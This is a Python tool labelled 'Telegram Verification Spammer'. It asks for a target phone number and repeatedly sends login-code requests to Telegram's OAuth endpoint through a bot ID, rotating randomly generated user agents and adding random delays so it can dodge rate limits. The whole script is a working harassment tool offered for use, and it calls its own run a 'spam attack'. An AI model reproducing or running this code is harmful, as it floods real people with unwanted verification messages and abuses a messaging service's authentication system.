import os
import sys
import time
import random
import requests
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from user_agent import generate_user_agent

# تثبيت المكتبات المطلوبة تلقائياً
try:
    from rich.console import Console
    from rich.table import Table
    import requests
    from user_agent import generate_user_agent
except ImportError:
    os.system(f"{sys.executable} -m pip install rich requests user_agent")
    from rich.console import Console
    from rich.table import Table
    import requests
    from user_agent import generate_user_agent

console = Console()

# ==================== قاموس رموز الدول الكامل ====================
COUNTRY_CODES = {
    # الشرق الأوسط
    "Afghanistan-🇦🇫": "+93",
    "Bahrain-🇧🇭": "+973",
    "Egypt-🇪🇬": "+20",
    "Iran-🇮🇷": "+98",
    "Iraq-🇮🇶": "+964",
    "Jordan-🇯🇴": "+962",
    "Kuwait-🇰🇼": "+965",
    "Lebanon-🇱🇧": "+961",
    "Oman-🇴🇲": "+968",
    "Palestine-🇵🇸": "+970",
    "Qatar-🇶🇦": "+974",
    "Saudi Arabia-🇸🇦": "+966",
    "Syria-🇸🇾": "+963",
    "Turkey-🇹🇷": "+90",
    "United Arab Emirates-🇦🇪": "+971",
    "Yemen-🇾🇪": "+967",
    
    # شمال أفريقيا
    "Algeria-🇩🇿": "+213",
    "Morocco-🇲🇦": "+212",
    "Tunisia-🇹🇳": "+216",
    "Libya-🇱🇾": "+218",
    "Sudan-🇸🇩": "+249",
    "South Sudan-🇸🇸": "+211",
    "Mauritania-🇲🇷": "+222",
    
    # القرن الأفريقي
    "Somalia-🇸🇴": "+252",
    "Djibouti-🇩🇯": "+253",
    "Eritrea-🇪🇷": "+291",
    "Ethiopia-🇪🇹": "+251",
    
    # أفريقيا الأخرى
    "Kenya-🇰🇪": "+254",
    "Nigeria-🇳🇬": "+234",
    "South Africa-🇿🇦": "+27",
    "Ghana-🇬🇭": "+233",
    "Tanzania-🇹🇿": "+255",
    "Uganda-🇺🇬": "+256",
    "Ethiopia-🇪🇹": "+251",
    
    # آسيا
    "India-🇮🇳": "+91",
    "Pakistan-🇵🇰": "+92",
    "Bangladesh-🇧🇩": "+880",
    "China-🇨🇳": "+86",
    "Japan-🇯🇵": "+81",
    "South Korea-🇰🇷": "+82",
    "Indonesia-🇮🇩": "+62",
    "Malaysia-🇲🇾": "+60",
    "Philippines-🇵🇭": "+63",
    "Vietnam-🇻🇳": "+84",
    "Thailand-🇹🇭": "+66",
    
    # أوروبا
    "United Kingdom-🇬🇧": "+44",
    "Germany-🇩🇪": "+49",
    "France-🇫🇷": "+33",
    "Italy-🇮🇹": "+39",
    "Spain-🇪🇸": "+34",
    "Russia-🇷🇺": "+7",
    "Greece-🇬🇷": "+30",
    
    # الأمريكتان
    "United States-🇺🇸": "+1",
    "Canada-🇨🇦": "+1",
    "Mexico-🇲🇽": "+52",
    "Brazil-🇧🇷": "+55",
    "Argentina-🇦🇷": "+54",
    
    # أوقيانوسيا
    "Australia-🇦🇺": "+61",
    "New Zealand-🇳🇿": "+64",
    
    # دول أخرى
    "Israel-🇮🇱": "+972",
    "Comoros-🇰🇲": "+269",
    "Maldives-🇲🇻": "+960",
    "Mauritius-🇲🇺": "+230",
    "Seychelles-🇸🇨": "+248"
}

# ==================== دالة لعرض البانر ====================
def show_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║                    🇸 🇵 🇦 🇲   🇹 🇴 🇴 🇱                    ║
    ║                Telegram Verification Spammer             ║
    ║                    By: AHMED ALHRRANI                    ║
    ╚══════════════════════════════════════════════════════════╝
    """
    console.print(Panel(banner, style="bold cyan", border_style="yellow"))

# ==================== دالة لعرض جدول الدول ====================
def show_country_table():
    table = Table(
        title="📞 Available Country Codes",
        title_style="bold magenta",
        border_style="blue",
        show_header=True,
        header_style="bold yellow"
    )
    
    table.add_column("#", justify="center", style="cyan", width=5)
    table.add_column("Country", justify="left", style="green", width=30)
    table.add_column("Code", justify="center", style="magenta", width=10)
    
    for idx, (country, code) in enumerate(COUNTRY_CODES.items(), 1):
        table.add_row(str(idx), country, code)
    
    console.print(table)

# ==================== دوال توليد User-Agent ====================
def generate_dalvik_agent():
    """توليد User-Agent لـ Android Dalvik"""
    versions = ["1.6.0", "2.1.0", "2.1.2", "2.1.3", "2.2.0"]
    android_versions = ["7.0", "8.1", "9", "10", "11", "12", "13", "14"]
    devices = [
        "SM-G960F", "SM-G975F", "SM-N960F", "Pixel 4", "Pixel 5", 
        "Pixel 6", "Pixel 7", "OnePlus 7T", "HUAWEI P30", "Xiaomi Mi 9",
        "Redmi Note 8", "OPPO Reno2", "Samsung Galaxy S21", "Samsung Galaxy S22"
    ]
    builds = [
        "QP1A.190711.020", "RP1A.200720.012", "PPR1.180610.011",
        "NRD90M", "QKQ1.190910.002", "LMY47V", "TP1A.220624.014"
    ]
    
    dalvik_ver = random.choice(versions)
    android_ver = random.choice(android_versions)
    device = random.choice(devices)
    build = random.choice(builds)
    
    return f"Dalvik/{dalvik_ver} (Linux; U; Android {android_ver}; {device} Build/{build})"

def generate_browser_agent(browser_type=None):
    """توليد User-Agent للمتصفحات المختلفة"""
    if browser_type is None:
        browser_type = random.choice(['chrome', 'firefox', 'safari', 'edge', 'brave', 'opera'])
    
    android_versions = ["9", "10", "11", "12", "13", "14"]
    devices = [
        "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Samsung Galaxy S21",
        "Samsung Galaxy S22", "Samsung Galaxy Note 20", "OnePlus 9", 
        "OnePlus 10 Pro", "Xiaomi Mi 11", "Huawei P40", "Sony Xperia 1 III"
    ]
    
    chrome_version = random.randint(89, 117)
    webkit_version = random.randint(537, 540)
    android_ver = random.choice(android_versions)
    device = random.choice(devices)
    
    if browser_type == "chrome":
        return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/{webkit_version}.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/{webkit_version}.36"
    
    elif browser_type == "firefox":
        firefox_ver = random.randint(120, 130)
        return f"Mozilla/5.0 (Android {android_ver}; Mobile; rv:{firefox_ver}.0) Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0"
    
    elif browser_type == "safari":
        return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/{webkit_version}.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/{webkit_version}.36"
    
    elif browser_type == "edge":
        return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/{webkit_version}.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/{webkit_version}.36 EdgA/{chrome_version}.0.0.0"
    
    elif browser_type == "brave":
        return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/{webkit_version}.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/{webkit_version}.36 Brave/{chrome_version}.0.0.0"
    
    elif browser_type == "opera":
        return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/{webkit_version}.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/{webkit_version}.36 OPR/75.0.0.0"

def generate_ios_agent():
    """توليد User-Agent لـ iOS"""
    ios_versions = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0", "17.2"]
    devices = [
        "iPhone12,1", "iPhone12,3", "iPhone13,4", "iPhone14,2",
        "iPhone14,5", "iPhone15,2", "iPhone15,3", "iPad8,1",
        "iPad8,9", "iPad11,6", "iPad13,1", "iPad13,2"
    ]
    
    ios_ver = random.choice(ios_versions)
    device = random.choice(devices)
    webkit_ver = random.randint(600, 605)
    safari_ver = random.randint(14, 17)
    
    return f"Mozilla/5.0 ({device}; CPU iPhone OS {ios_ver.replace('.', '_')} like Mac OS X) AppleWebKit/{webkit_ver}.1 (KHTML, like Gecko) Version/{safari_ver}.0 Mobile/15E148 Safari/{webkit_ver}.1"

# ==================== دالة الإسبام الرئيسية ====================
def send_spam_request(phone_number, attempt):
    """إرسال طلب الإسبام"""
    agents = [
        generate_dalvik_agent(),
        generate_browser_agent(),
        generate_ios_agent(),
        generate_user_agent()
    ]
    
    user_agent = random.choice(agents)
    
    headers = {
        'User-Agent': user_agent,
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/x-www-form-urlencoded",
        'sec-ch-ua': "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Android WebView\";v=\"128\"",
        'sec-ch-ua-platform': "\"Android\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://oauth.telegram.org",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write",
        'accept-language': "ar,ar-YE;q=0.9,en-US;q=0.8,en;q=0.7",
        'priority': "u=1, i",
    }
    
    payload = f"phone={phone_number}"
    
    try:
        response = requests.post(
            "https://oauth.telegram.org/auth/request",
            params={
                'bot_id': "5444323279",
                'origin': "https://fragment.com",
                'request_access': "write",
            },
            data=payload,
            headers=headers,
            timeout=10
        )
        
        return response
    except Exception as e:
        return None

# ==================== الدالة الرئيسية ====================
def main():
    # عرض البانر
    show_banner()
    
    # عرض جدول الدول
    show_country_table()
    
    # اختيار الدولة
    while True:
        try:
            choice = int(input("\n📌 Choose a country by number: "))
            if 1 <= choice <= len(COUNTRY_CODES):
                selected_country = list(COUNTRY_CODES.keys())[choice - 1]
                country_code = COUNTRY_CODES[selected_country]
                break
            else:
                console.print("[bold red]Invalid choice! Please select a valid number.[/bold red]")
        except ValueError:
            console.print("[bold red]Please enter a valid number![/bold red]")
    
    # إدخال رقم الهاتف
    console.print(f"\n✅ Selected Country: [bold green]{selected_country}[/bold green]")
    console.print(f"📞 Country Code: [bold cyan]{country_code}[/bold cyan]")
    
    while True:
        phone_number = input("\n📱 Enter phone number (without country code): ").strip()
        if phone_number.isdigit() and len(phone_number) >= 8:
            break
        else:
            console.print("[bold red]Invalid phone number! Please enter digits only.[/bold red]")
    
    # تجميع الرقم الكامل
    full_number = f"{country_code}{phone_number}"
    console.print(f"\n🎯 Target Number: [bold red]{full_number}[/bold red]")
    
    # تأكيد البدء
    confirm = input("\n⚠️  Start spam attack? (y/n): ").lower()
    if confirm != 'y':
        console.print("[bold yellow]Operation cancelled![/bold yellow]")
        return
    
    # بدء الهجوم
    console.print("\n" + "="*50)
    console.print("[bold magenta]🚀 Starting Spam Attack...[/bold magenta]")
    console.print("[bold yellow]Press Ctrl+C to stop[/bold yellow]")
    console.print("="*50 + "\n")
    
    attempt_count = 0
    success_count = 0
    error_count = 0
    
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Sending requests...", total=None)
            
            while True:
                attempt_count += 1
                response = send_spam_request(full_number, attempt_count)
                
                if response and response.status_code == 200:
                    success_count += 1
                    status = f"[green]Success[/green]"
                    try:
                        response_text = response.json().get('phone_code_hash', 'Code sent')
                    except:
                        response_text = response.text[:50]
                else:
                    error_count += 1
                    status = f"[red]Failed[/red]"
                    response_text = "Error"
                
                # تحديث شريط التقدم
                progress.update(task, advance=1, 
                    description=f"[cyan]Attempt {attempt_count}: {status} | Success: {success_count} | Errors: {error_count}")
                
                # عرض تحديث كل 5 محاولات
                if attempt_count % 5 == 0:
                    console.print(f"\n📊 [bold]Stats:[/bold] Attempts: {attempt_count} | Success: {success_count} | Errors: {error_count}")
                
                # تأخير عشوائي بين المحاولات
                time.sleep(random.uniform(0.5, 2))
                
    except KeyboardInterrupt:
        console.print("\n\n[bold yellow]⚠️  Spam attack stopped by user![/bold yellow]")
    
    finally:
        # عرض النتائج النهائية
        console.print("\n" + "="*50)
        console.print("[bold magenta]📊 FINAL REPORT[/bold magenta]")
        console.print("="*50)
        console.print(f"🎯 Target Number: [bold]{full_number}[/bold]")
        console.print(f"📤 Total Attempts: [cyan]{attempt_count}[/cyan]")
        console.print(f"✅ Successful: [green]{success_count}[/green]")
        console.print(f"❌ Failed: [red]{error_count}[/red]")
        console.print(f"📈 Success Rate: [yellow]{(success_count/attempt_count*100 if attempt_count > 0 else 0):.1f}%[/yellow]")
        console.print("\n[bold green]✨ Operation completed![/bold green]")

# ==================== تشغيل البرنامج ====================
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"[bold red]Critical Error: {str(e)}[/bold red]")
    finally:
        input("\nPress Enter to exit...")